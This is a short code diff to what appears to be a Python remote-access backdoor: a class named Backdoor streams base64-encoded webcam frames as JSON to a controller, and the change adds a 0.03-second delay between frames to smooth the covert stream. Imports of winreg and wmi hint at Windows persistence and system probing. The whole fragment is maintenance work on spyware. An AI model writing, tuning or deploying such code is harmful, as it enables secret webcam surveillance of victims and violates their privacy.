@@ -5,6 +5,7 @@ import os
 import base64
 import cv2
 import threading
+import time
 import winreg
 import wmi
 
@@ -100,6 +101,7 @@ class Backdoor:
             _, buffer = cv2.imencode('.jpg', frame)
             frame_data = base64.b64encode(buffer).decode()
             self.send_json({"type": "webcam_frame", "data": frame_data})
+            time.sleep(0.03)  # Adds 0.03 seconds delay before sending the next frame
 
     def run(self):
         webcam_thread = threading.Thread(target=self.stream_webcam, daemon=True)
